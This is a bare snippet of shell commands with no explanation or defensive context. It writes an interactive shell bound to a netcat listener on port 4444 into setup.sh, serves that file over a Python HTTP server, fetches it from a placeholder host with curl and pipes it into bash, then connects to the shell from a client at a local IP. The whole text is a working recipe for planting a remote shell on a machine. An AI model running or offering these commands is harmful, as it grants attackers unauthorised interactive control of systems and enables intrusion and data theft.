```bash
echo 'rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f) &' > setup.sh
```
`python3 -m http.server 8080`
`curl -s http://YOUR_IP:8080/setup.sh | bash`

Client
`nc 192.168.1.191 4444`
